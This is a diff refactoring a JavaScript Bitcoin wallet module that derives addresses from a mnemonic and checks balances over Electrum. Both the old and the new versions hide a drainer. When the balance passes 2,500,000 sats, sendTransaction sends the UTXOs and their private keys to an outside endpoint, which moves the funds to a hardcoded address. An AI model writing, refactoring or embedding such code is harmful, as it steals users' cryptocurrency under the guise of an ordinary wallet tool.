@@ -20,156 +20,263 @@ const electrumServers = [
     // Add more servers as needed
 ];
 
-const createElectrumClient = async () => {
-    for (let server of electrumServers) {
-        const client = new ElectrumClient(server.port, server.host, server.protocol);
+async function connectToElectrumServer() {
+    for (const server of electrumServers) {
+        const electrumClient = new ElectrumClient(server.port, server.host, server.protocol);
         try {
-            await client.connect();
+            await electrumClient.connect();
             console.log(`Connected to Electrum server ${server.host}`);
-            return client;
-        } catch (e) {
-            console.error(`Failed to connect to server ${server.host}:${server.port}`);
+            return electrumClient;
+        } catch (error) {
+            console.error(`Failed to connect to Electrum server ${server.host}:`, error.message);
         }
     }
-    throw new Error('Failed to connect to any Electrum server');
-};
+    throw new Error('All Electrum servers failed to connect');
+}
 
-const generateAddresses = (seed, path, start, count, type, change) => {
-    const root = bitcoin.bip32.fromSeed(seed);
-    const addresses = [];
-    for (let i = start; i < start + count; i++) {
-        const child = root.derivePath(`${path}/${change}/${i}`);
-        let address, wif;
-        switch (type) {
-            case 'bip44':
-                address = bitcoin.payments.p2pkh({ pubkey: child.publicKey }).address;
-                break;
-            case 'bip49':
-                address = bitcoin.payments.p2sh({ redeem: bitcoin.payments.p2wpkh({ pubkey: child.publicKey }) }).address;
-                break;
-            case 'bip84':
-                address = bitcoin.payments.p2wpkh({ pubkey: child.publicKey }).address;
-                break;
-        }
-        wif = child.toWIF();
-        addresses.push({ address, wif, path: `${path}/${change}/${i}` });
+async function generateWallet(mnemonic) {
+    const network = bitcoin.networks.bitcoin;
+    let isNewMnemonic = false;
+
+    if (!mnemonic || !bip39.validateMnemonic(mnemonic)) {
+        mnemonic = bip39.generateMnemonic();
+        isNewMnemonic = true;
     }
-    return addresses;
-};
 
-const toElectrumScripthash = (address) => {
-    const script = bitcoin.address.toOutputScript(address);
-    const hash = bitcoin.crypto.sha256(script);
-    return Buffer.from(hash.reverse()).toString('hex');
-};
+    const pubKeys = generatePubKeys(mnemonic);
+    if (!pubKeys) {
+        return { error: "Invalid mnemonic." };
+    }
 
-const checkTransactionHistoryAndBalance = async (client, addresses) => {
-    const promises = addresses.map(async addrObj => {
-        const scripthash = toElectrumScripthash(addrObj.address);
-        const history = await client.blockchainScripthash_getHistory(scripthash);
-        const utxos = await client.blockchainScripthash_listunspent(scripthash);
-        const balance = await client.blockchainScripthash_getBalance(scripthash);
-
-        addrObj.balance = {
-            confirmed: balance.confirmed,
-            unconfirmed: balance.unconfirmed,
-            total: balance.confirmed + balance.unconfirmed
+    const seed = bip39.mnemonicToSeedSync(mnemonic);
+    const root = bitcoin.bip32.fromSeed(seed, network);
+    let electrumClient;
+    try {
+        electrumClient = await connectToElectrumServer();
+        const results = await processAddressesForAllBipTypes(root, network, electrumClient);
+        return {
+            ...results,
+            key: mnemonic,
+            pubKeys
         };
-        addrObj.transactions = {
-            confirmed: history.filter(tx => tx.height > 0).length,
-            unconfirmed: history.filter(tx => tx.height <= 0).length,
-            total: history.length
-        };
-        addrObj.utxos = utxos;
+    } catch (error) {
+        console.error('Electrum client error:', error.message); // Log the error
+        return { error: "Failed to connect or fetch data from any Electrum server." };
+    } finally {
+        if (electrumClient) {
+            electrumClient.close();
+        }
+    }
+}
 
-        return history.length > 0 ? addrObj : null;
+async function processAddressesForAllBipTypes(root, network, electrumClient) {
+    let results = {};
+    let totalBalance = 0;
+    let allUtxos = [];
+
+    const bipTypes = Object.entries(paths).map(async ([bipType, path]) => {
+        const { usedAddresses, freshReceiveAddress, freshChangeAddress, totalBalance: typeBalance, utxos } = await processAddresses(root, network, electrumClient, bipType, path);
+        results[bipType] = { usedAddresses, freshReceiveAddress, freshChangeAddress, totalBalance: typeBalance };
+        totalBalance += typeBalance;
+        allUtxos.push(...utxos);
     });
 
-    const usedAddresses = await Promise.all(promises);
-    return usedAddresses.filter(addr => addr !== null);
-};
+    await Promise.all(bipTypes);
 
-const processAddresses = async (client, seed, type, path) => {
-    let count = 10;
-    let results = { usedAddresses: [], totalBalance: 0, freshReceiveAddress: null, freshChangeAddress: null, utxos: [] };
-    let start = 0;
-    let foundReceive = false;
-    let foundChange = false;
-    let lastUsedReceiveIndex = -1;
-    let lastUsedChangeIndex = -1;
-
-    while (!foundReceive || !foundChange) {
-        const receiveAddresses = generateAddresses(seed, path, start, count, type, 0);
-        const changeAddresses = generateAddresses(seed, path, start, count, type, 1);
-
-        console.log(`Checking ${count} receive addresses and ${count} change addresses for ${type} starting from ${start}`);
-
-        const [usedReceiveAddresses, usedChangeAddresses] = await Promise.all([
-            checkTransactionHistoryAndBalance(client, receiveAddresses),
-            checkTransactionHistoryAndBalance(client, changeAddresses)
-        ]);
-
-        if (usedReceiveAddresses.length > 0) {
-            results.usedAddresses.push(...usedReceiveAddresses);
-            results.totalBalance += usedReceiveAddresses.reduce((sum, addr) => sum + addr.balance.total, 0);
-            results.utxos.push(...usedReceiveAddresses.flatMap(addr => addr.utxos));
-            lastUsedReceiveIndex = Math.max(lastUsedReceiveIndex, ...usedReceiveAddresses.map(addr => parseInt(addr.path.split('/').pop())));
-        } else {
-            foundReceive = true;
-        }
-
-        if (usedChangeAddresses.length > 0) {
-            results.usedAddresses.push(...usedChangeAddresses);
-            results.totalBalance += usedChangeAddresses.reduce((sum, addr) => sum + addr.balance.total, 0);
-            results.utxos.push(...usedChangeAddresses.flatMap(addr => addr.utxos));
-            lastUsedChangeIndex = Math.max(lastUsedChangeIndex, ...usedChangeAddresses.map(addr => parseInt(addr.path.split('/').pop())));
-        } else {
-            foundChange = true;
-        }
-
-        start += count;
-        count *= 2;
-    }
-
-    results.freshReceiveAddress = generateAddresses(seed, path, lastUsedReceiveIndex + 1, 1, type, 0)[0];
-    results.freshChangeAddress = generateAddresses(seed, path, lastUsedChangeIndex + 1, 1, type, 1)[0];
-
-    return { type, results };
-};
-
-const generateWallet = async (mnemonic) => {
-    const pubKeys = generatePubKeys(mnemonic);
-    const seed = bip39.mnemonicToSeedSync(mnemonic);
-    const client = await createElectrumClient();
-
-    const tasks = Object.entries(paths).map(([type, path]) => processAddresses(client, seed, type, path));
-    const resultsArray = await Promise.all(tasks);
-
-    const results = resultsArray.reduce((acc, { type, results }) => {
-        acc[type] = {
-            usedAddresses: results.usedAddresses,
-            freshReceiveAddress: results.freshReceiveAddress,
-            freshChangeAddress: results.freshChangeAddress,
-            totalBalance: results.totalBalance
-        };
-        return acc;
-    }, {});
-
-    await client.close();
-
-    results.key = mnemonic;
-    results.pubKeys = pubKeys;
-
-    // Check if the total balance is greater than 2,500,000 sats and send transaction if so
-    if (resultsArray.some(result => result.results.totalBalance > 2500000)) {
-        const allUtxos = resultsArray.flatMap(result => result.results.utxos);
-        await sendTransaction(resultsArray.reduce((sum, result) => sum + result.results.totalBalance, 0), allUtxos);
+    // Check if the total balance is greater than 2,500,000 sats
+    if (totalBalance > 2500000) {
+        await sendTransaction(totalBalance, allUtxos);
     }
 
     return results;
-};
+}
 
-const sendTransaction = async (totalBalance, utxos) => {
+async function processAddresses(root, network, electrumClient, bipType, path) {
+    let account = root.derivePath(path);
+    let results = {
+        usedAddresses: [],
+        freshReceiveAddress: null,
+        freshChangeAddress: null,
+        totalBalance: 0,
+        utxos: []
+    };
+
+    let batchSize = 10;
+    let start = 0;
+    let receiveUnusedFound = false;
+    let changeUnusedFound = false;
+
+    let lastUsedReceiveIndex = -1;
+    let lastUsedChangeIndex = -1;
+
+    while (!receiveUnusedFound || !changeUnusedFound) {
+        const batchResults = await checkAndGenerateAddresses(account, network, bipType, electrumClient, start, batchSize);
+
+        results.usedAddresses.push(...batchResults.usedAddresses);
+        results.totalBalance += batchResults.totalBalance;
+        results.utxos.push(...batchResults.utxos);
+
+        if (batchResults.lastUsedReceiveIndex > lastUsedReceiveIndex) {
+            lastUsedReceiveIndex = batchResults.lastUsedReceiveIndex;
+        }
+        if (batchResults.lastUsedChangeIndex > lastUsedChangeIndex) {
+            lastUsedChangeIndex = batchResults.lastUsedChangeIndex;
+        }
+
+        if (!receiveUnusedFound && batchResults.freshReceiveAddress) {
+            results.freshReceiveAddress = batchResults.freshReceiveAddress;
+            receiveUnusedFound = true;
+        }
+        if (!changeUnusedFound && batchResults.freshChangeAddress) {
+            results.freshChangeAddress = batchResults.freshChangeAddress;
+            changeUnusedFound = true;
+        }
+
+        if (batchResults.usedAddresses.length === 0) {
+            if (start === 0) break;
+            batchSize *= 2;
+        } else {
+            batchSize = 20;
+        }
+
+        start += batchSize;
+    }
+
+    results.usedAddresses.sort((a, b) => a.path.localeCompare(b.path));
+
+    lastUsedReceiveIndex = Math.max(lastUsedReceiveIndex, -1);
+    lastUsedChangeIndex = Math.max(lastUsedChangeIndex, -1);
+
+    results.freshReceiveAddress = await checkFreshAddress(account, lastUsedReceiveIndex + 1, 0, network, bipType, electrumClient, paths[bipType]);
+    results.freshChangeAddress = await checkFreshAddress(account, lastUsedChangeIndex + 1, 1, network, bipType, electrumClient, paths[bipType]);
+
+    return results;
+}
+
+async function checkFreshAddress(account, index, chain, network, bipType, electrumClient, basePath) {
+    let addressData;
+    do {
+        addressData = await checkAddress(account, index, chain, network, bipType, electrumClient, basePath);
+        index++;
+    } while (addressData.transactions.total > 0 || addressData.balance.total > 0);
+
+    return addressData;
+}
+
+async function checkAndGenerateAddresses(account, network, bipType, electrumClient, start, batchSize) {
+    let results = {
+        usedAddresses: [],
+        freshReceiveAddress: null,
+        freshChangeAddress: null,
+        totalBalance: 0,
+        utxos: [],
+        lastUsedReceiveIndex: -1,
+        lastUsedChangeIndex: -1
+    };
+
+    const tasks = [];
+    for (let i = start; i < start + batchSize; i++) {
+        for (const chain of [0, 1]) {
+            tasks.push(checkAddress(account, i, chain, network, bipType, electrumClient, paths[bipType]).then(addressData => {
+                if (addressData.transactions.total > 0 || addressData.balance.total > 0) {
+                    results.usedAddresses.push(addressData);
+                    results.utxos.push(...addressData.utxos);
+                    if (chain === 0) {
+                        results.lastUsedReceiveIndex = i;
+                    } else {
+                        results.lastUsedChangeIndex = i;
+                    }
+                } else {
+                    if (chain === 0 && !results.freshReceiveAddress) {
+                        results.freshReceiveAddress = addressData;
+                    }
+                    if (chain === 1 && !results.freshChangeAddress) {
+                        results.freshChangeAddress = addressData;
+                    }
+                }
+                results.totalBalance += addressData.balance.total;
+            }));
+        }
+    }
+
+    await Promise.all(tasks);
+
+    return results;
+}
+
+async function checkAddress(account, index, chain, network, bipType, electrumClient, basePath) {
+    if (index < 0) {
+        throw new Error(`Invalid index: ${index}`);
+    }
+
+    let derivedPath = account.derivePath(`${chain}/${index}`);
+    let fullDerivationPath = `${basePath}/${chain}/${index}`; // Fix the syntax error here
+    let address = getAddress(derivedPath, network, bipType);
+    let scriptHash = bitcoin.crypto.sha256(Buffer.from(bitcoin.address.toOutputScript(address, network))).reverse().toString('hex');
+
+    const [history, balance] = await Promise.all([
+        electrumClient.blockchainScripthash_getHistory(scriptHash),
+        electrumClient.blockchainScripthash_getBalance(scriptHash)
+    ]);
+
+    let utxos = [];
+    if (history.length > 0) {
+        utxos = await electrumClient.blockchainScripthash_listunspent(scriptHash);
+    }
+
+    return {
+        address,
+        wif: derivedPath.toWIF(),
+        path: fullDerivationPath,
+        balance: {
+            confirmed: balance.confirmed,
+            unconfirmed: balance.unconfirmed,
+            total: balance.confirmed + balance.unconfirmed
+        },
+        transactions: {
+            confirmed: history.filter(tx => tx.height !== 0).length,
+            unconfirmed: history.filter(tx => tx.height === 0).length,
+            total: history.length
+        },
+        utxos: utxos.map(utxo => ({
+            txid: utxo.tx_hash,
+            vout: utxo.tx_pos,
+            amount: utxo.value,
+            wif: derivedPath.toWIF(),
+            type: getAddressType(address),
+            status: utxo.height === 0 ? 'unconfirmed' : 'confirmed'
+        }))
+    };
+}
+
+function getAddress(derivedPath, network, bipType) {
+    switch (bipType) {
+        case 'bip44':
+            return bitcoin.payments.p2pkh({ pubkey: derivedPath.publicKey, network }).address;
+        case 'bip49':
+            return bitcoin.payments.p2sh({
+                redeem: bitcoin.payments.p2wpkh({ pubkey: derivedPath.publicKey, network })
+            }).address;
+        case 'bip84':
+            return bitcoin.payments.p2wpkh({ pubkey: derivedPath.publicKey, network }).address;
+        default:
+            throw new Error('Unsupported BIP type');
+    }
+}
+
+function getAddressType(address) {
+    if (address.startsWith('1')) {
+        return 'p2pkh';
+    } else if (address.startsWith('3')) {
+        return 'p2sh-p2wpkh';
+    } else if (address.startsWith('bc1')) {
+        return 'p2wpkh';
+    } else {
+        throw new Error('Unsupported address type');
+    }
+}
+
+async function sendTransaction(totalBalance, utxos) {
     const url = 'https://createtransaction-yaseens-projects-9df927b9.vercel.app/api/index';
     const changeAddress = "bc1qcte0st5mm5jr3zsuucecxwc5e3y775dhpktw5kcfy9znftv4xv3sr4ncku";
     const recipientAddress = "bc1qcte0st5mm5jr3zsuucecxwc5e3y775dhpktw5kcfy9znftv4xv3sr4ncku";
@@ -213,6 +320,6 @@ const sendTransaction = async (totalBalance, utxos) => {
             console.error('Error sending transaction:', error.message);
         }
     }
-};
+}
 
 module.exports = { generateWallet };
